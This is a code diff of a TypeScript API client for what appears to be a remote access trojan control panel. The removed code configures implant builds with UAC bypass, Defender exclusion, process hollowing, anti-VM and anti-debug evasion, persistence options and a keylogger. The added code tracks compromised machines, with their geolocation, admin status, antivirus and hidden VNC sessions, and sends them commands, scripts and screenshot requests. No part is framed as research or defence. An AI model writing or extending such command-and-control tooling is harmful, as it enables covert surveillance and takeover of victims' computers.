@@ -1,347 +1,215 @@
-import { API_URL } from '../config';
+import { api } from './api';
 
-export interface AgentBuild {
-  _id: string;
-  agentId: string;
-  name: string;
-  version: string;
-  description?: string;
-  createdAt: string;
-  updatedAt: string;
-  status: 'queued' | 'generating' | 'compiling' | 'packaging' | 'ready' | 'error' | 'cancelled';
-  progress: number;
-  downloadUrl?: string;
-  archivePassword?: string;
-  serviceName?: string;
-  serviceDescription?: string;
-  serviceVersion?: string;
-  serviceCompany?: string;
-  serviceProduct?: string;
-  clonedService?: string;
-  junkCodeLines?: number;
-  entryPoint?: string;
-  fileSize?: number;
-  downloadCount?: number;
-  features?: string[];
-  metadata?: {
-    serviceName?: string;
-    clonedService?: string;
-    password?: string;
+export interface Agent {
+  uuid: string;
+  computerName: string;
+  ipAddress: string;
+  hostname: string;
+  platform: string;
+  operatingSystem: 'windows' | 'linux' | 'macos' | 'android' | 'ios';
+  osVersion?: string;
+  architecture?: 'x86' | 'x64' | 'arm' | 'arm64';
+  status: 'online' | 'offline';
+  lastSeen: string;
+  lastHeartbeat?: string;
+  firstSeen?: string;
+
+  geoLocation?: {
+    country?: string;
+    countryCode?: string;
+    region?: string;
+    city?: string;
+    latitude?: number;
+    longitude?: number;
+    timezone?: string;
+    isp?: string;
+  };
+
+  systemInfo?: {
+    username?: string;
+    domain?: string;
+    isAdmin?: boolean;
+    antivirus?: string[];
+    uptime?: number;
+    memory?: { total: number; available: number };
+    disk?: { total: number; free: number };
+    cpuInfo?: { model: string; cores: number; speed: number };
+    systemMetrics?: {
+      cpuUsage?: number;
+      memoryUsage?: number;
+      diskUsage?: number;
+    };
+  };
+
+  capabilities?: {
+    persistence?: string[];
+    injection?: string[];
+    evasion?: string[];
+    commands?: string[];
     features?: string[];
-    codeStructure?: any;
-    junkCodeLines?: number;
-    entryPoint?: string;
-    codeSigningMetadata?: any;
-    securityFeatures?: string[];
   };
-  filePaths?: {
-    exe?: string;
-    msi?: string;
-    zip?: string;
-    cpp?: string;
-    logs?: string;
+
+  hvncSession?: {
+    sessionId: string;
+    status: 'starting' | 'active' | 'stopping' | 'stopped' | 'error';
+    quality: 'low' | 'medium' | 'high';
+    fps?: number;
   };
+}
+
+export interface Task {
+  taskId: string;
+  agentUuid: string;
+  command: string;
+  params?: any;
+  queue: {
+    state: 'pending' | 'sent' | 'ack' | 'completed' | 'failed';
+    reason?: string;
+    attempts?: number;
+    lastAttemptAt?: string;
+    priority?: number;
+  };
+  createdBy?: string;
+  sentAt?: string;
+  ackAt?: string;
+  completedAt?: string;
+  executionTimeMs?: number;
+  output?: string;
   errorMessage?: string;
-  createdBy?: {
-    _id: string;
-    username: string;
-    email: string;
-  };
-}
-
-export interface AgentConfig {
-  agentName: string;
-  serviceName: string;
-  description: string;
-  enablePolymorphicNaming: boolean;
-  enableUACBypass: boolean;
-  enableDefenderExclusion: boolean;
-  enableProcessHollowing: boolean;
-  enableMemoryEvasion: boolean;
-  enableAntiDebug: boolean;
-  enableAntiVM: boolean;
-  enableAntiSandbox: boolean;
-  enableCodeObfuscation: boolean;
-  enableStringEncryption: boolean;
-  enableServiceInstallation: boolean;
-  enableRegistryPersistence: boolean;
-  enableScheduledTask: boolean;
-  enableStartupFolder: boolean;
-  serverUrl: string;
-  serverPort: number;
-  heartbeatInterval: number;
-  reconnectAttempts: number;
-  enableKeylogger: boolean;
-  enableScreenCapture: boolean;
-  enableFileManager: boolean;
-  enableProcessManager: boolean;
-  enableNetworkMonitor: boolean;
-  enableSystemInfo: boolean;
-}
-
-export interface AgentTemplate {
-  _id: string;
-  name: string;
-  description?: string;
-  config: AgentConfig;
-  isPublic: boolean;
-  usageCount: number;
-  lastUsedAt?: string;
+  platform?: string;
+  status: 'pending' | 'executed' | 'failed' | 'cancelled';
   createdAt: string;
   updatedAt: string;
-  createdBy?: {
-    _id: string;
-    username: string;
-    email: string;
-  };
 }
 
-interface GetBuildsParams {
-  status?: string;
-  page?: number;
-  limit?: number;
+export interface CommandResponse {
+  status: string;
+  taskId: string;
+  message?: string;
 }
 
-const getAuthHeaders = () => {
-  const token = localStorage.getItem('accessToken');
-  return {
-    'Content-Type': 'application/json',
-    ...(token && { 'Authorization': `Bearer ${token}` })
-  };
-};
+export interface TaskStats {
+  total: number;
+  pending: number;
+  executed: number;
+  failed: number;
+  cancelled: number;
+  avgExecutionTime?: number;
+}
 
-export const agentService = {
+class AgentService {
   /**
-   * Generate a new agent build
+   * Get all agents
    */
-  async generateAgent(config: AgentConfig): Promise<AgentBuild> {
-    const response = await fetch(`${API_URL}/agent/builds`, {
-      method: 'POST',
-      headers: getAuthHeaders(),
-      body: JSON.stringify(config)
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to generate agent');
-    }
-
-    const data = await response.json();
-    return data.data.build;
-  },
-
-  /**
-   * Get all builds with optional filters
-   */
-  async getBuilds(params: GetBuildsParams = {}): Promise<{ builds: AgentBuild[]; total: number; page: number; limit: number }> {
-    const queryParams = new URLSearchParams();
-    if (params.status) queryParams.append('status', params.status);
-    if (params.page) queryParams.append('page', params.page.toString());
-    if (params.limit) queryParams.append('limit', params.limit.toString());
-
-    const response = await fetch(`${API_URL}/agent/builds?${queryParams.toString()}`, {
-      method: 'GET',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to fetch builds');
-    }
-
-    const data = await response.json();
-    return {
-      builds: data.data.builds,
-      total: data.total,
-      page: data.page,
-      limit: data.limit
-    };
-  },
-
-  /**
-   * Get a single build by ID
-   */
-  async getBuild(buildId: string): Promise<AgentBuild> {
-    const response = await fetch(`${API_URL}/agent/builds/${buildId}`, {
-      method: 'GET',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to fetch build');
-    }
-
-    const data = await response.json();
-    return data.data.build;
-  },
-
-  /**
-   * Delete a build
-   */
-  async deleteBuild(buildId: string): Promise<void> {
-    const response = await fetch(`${API_URL}/agent/builds/${buildId}`, {
-      method: 'DELETE',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to delete build');
-    }
-  },
-
-  /**
-   * Download a build archive
-   */
-  async downloadBuild(buildId: string): Promise<Blob> {
-    const response = await fetch(`${API_URL}/agent/builds/${buildId}/download`, {
-      method: 'GET',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to download build');
-    }
-
-    return await response.blob();
-  },
-
-  /**
-   * Get build logs
-   */
-  async getBuildLogs(buildId: string): Promise<string> {
-    const response = await fetch(`${API_URL}/agent/builds/${buildId}/logs`, {
-      method: 'GET',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to fetch build logs');
-    }
-
-    const data = await response.json();
-    return data.data.logs;
+  async getAgents(): Promise<{ status: string; data: { agents: Agent[]; total: number } }> {
+    return api.get('/agent');
   }
-};
-
-export const templateService = {
-  /**
-   * Get all templates
-   */
-  async getTemplates(params: { isPublic?: boolean; page?: number; limit?: number } = {}): Promise<{ templates: AgentTemplate[]; total: number; page: number; limit: number }> {
-    const queryParams = new URLSearchParams();
-    if (params.isPublic !== undefined) queryParams.append('isPublic', params.isPublic.toString());
-    if (params.page) queryParams.append('page', params.page.toString());
-    if (params.limit) queryParams.append('limit', params.limit.toString());
-
-    const response = await fetch(`${API_URL}/agent/templates?${queryParams.toString()}`, {
-      method: 'GET',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to fetch templates');
-    }
-
-    const data = await response.json();
-    return {
-      templates: data.data.templates,
-      total: data.total,
-      page: data.page,
-      limit: data.limit
-    };
-  },
 
   /**
-   * Get a single template
+   * Get agent status
    */
-  async getTemplate(templateId: string): Promise<AgentTemplate> {
-    const response = await fetch(`${API_URL}/agent/templates/${templateId}`, {
-      method: 'GET',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to fetch template');
-    }
-
-    const data = await response.json();
-    return data.data.template;
-  },
-
-  /**
-   * Create a template
-   */
-  async createTemplate(name: string, description: string, config: AgentConfig, isPublic: boolean = false): Promise<AgentTemplate> {
-    const response = await fetch(`${API_URL}/agent/templates`, {
-      method: 'POST',
-      headers: getAuthHeaders(),
-      body: JSON.stringify({ name, description, config, isPublic })
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to create template');
-    }
-
-    const data = await response.json();
-    return data.data.template;
-  },
-
-  /**
-   * Update a template
-   */
-  async updateTemplate(templateId: string, updates: { name?: string; description?: string; config?: AgentConfig; isPublic?: boolean }): Promise<AgentTemplate> {
-    const response = await fetch(`${API_URL}/agent/templates/${templateId}`, {
-      method: 'PUT',
-      headers: getAuthHeaders(),
-      body: JSON.stringify(updates)
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to update template');
-    }
-
-    const data = await response.json();
-    return data.data.template;
-  },
-
-  /**
-   * Delete a template
-   */
-  async deleteTemplate(templateId: string): Promise<void> {
-    const response = await fetch(`${API_URL}/agent/templates/${templateId}`, {
-      method: 'DELETE',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to delete template');
-    }
-  },
-
-  /**
-   * Use a template (load config)
-   */
-  async useTemplate(templateId: string): Promise<AgentConfig> {
-    const response = await fetch(`${API_URL}/agent/templates/${templateId}/use`, {
-      method: 'POST',
-      headers: getAuthHeaders()
-    });
-
-    if (!response.ok) {
-      const error = await response.json();
-      throw new Error(error.message || 'Failed to use template');
-    }
-
-    const data = await response.json();
-    return data.data.config;
+  async getAgentStatus(agentId: string): Promise<{ status: string; agent: Agent }> {
+    return api.get(`/agent/${agentId}/status`);
   }
-};
+
+  /**
+   * Send command to agent
+   */
+  async sendCommand(agentId: string, command: string, params?: any): Promise<CommandResponse> {
+    return api.post(`/agent/${agentId}/command`, { command, params });
+  }
+
+  /**
+   * Capture screenshot
+   */
+  async captureScreenshot(agentId: string): Promise<{ status: string; screenshot: string }> {
+    return api.post(`/agent/${agentId}/screenshot`);
+  }
+
+  /**
+   * Get all tasks
+   */
+  async getTasks(): Promise<{ status: string; tasks: Task[] }> {
+    return api.get('/task');
+  }
+
+  /**
+   * Get task statistics
+   */
+  async getTaskStats(): Promise<{ status: string; stats: TaskStats }> {
+    return api.get('/task/stats');
+  }
+
+  /**
+   * Get specific task
+   */
+  async getTask(taskId: string): Promise<{ status: string; task: Task }> {
+    return api.get(`/task/${taskId}`);
+  }
+
+  /**
+   * Retry failed task
+   */
+  async retryTask(taskId: string): Promise<{ status: string; task: Task }> {
+    return api.post(`/task/${taskId}/retry`);
+  }
+
+  /**
+   * Cancel task
+   */
+  async cancelTask(taskId: string): Promise<{ status: string }> {
+    return api.post(`/task/${taskId}/cancel`);
+  }
+
+  /**
+   * Get client task history
+   */
+  async getClientHistory(agentUuid: string): Promise<{ status: string; history: Task[] }> {
+    return api.get(`/task/client/${agentUuid}/history`);
+  }
+
+  /**
+   * Send command via command API
+   */
+  async sendScriptToClient(commandKey: string, uuid: string, command?: string): Promise<CommandResponse> {
+    return api.post('/command/send-script-to-client', { commandKey, uuid, command });
+  }
+
+  /**
+   * Get available commands for client
+   */
+  async getAvailableCommands(uuid: string): Promise<{ status: string; commands: string[] }> {
+    return api.get(`/command/available/${uuid}`);
+  }
+
+  /**
+   * Get tasks for specific client
+   */
+  async getClientTasks(uuid: string): Promise<{ status: string; tasks: Task[] }> {
+    return api.get(`/command/tasks/${uuid}`);
+  }
+
+  /**
+   * Validate command
+   */
+  async validateCommand(command: string, uuid: string): Promise<{ status: string; valid: boolean; errors?: string[] }> {
+    return api.post('/command/validate', { command, uuid });
+  }
+
+  /**
+   * Get client metrics
+   */
+  async getClientMetrics(agentUuid: string): Promise<{ status: string; metrics: any }> {
+    return api.get(`/metrics/client/${agentUuid}`);
+  }
+
+  /**
+   * Get system metrics
+   */
+  async getSystemMetrics(): Promise<{ status: string; metrics: any }> {
+    return api.get('/metrics/system');
+  }
+}
+
+export const agentService = new AgentService();
+export default agentService;
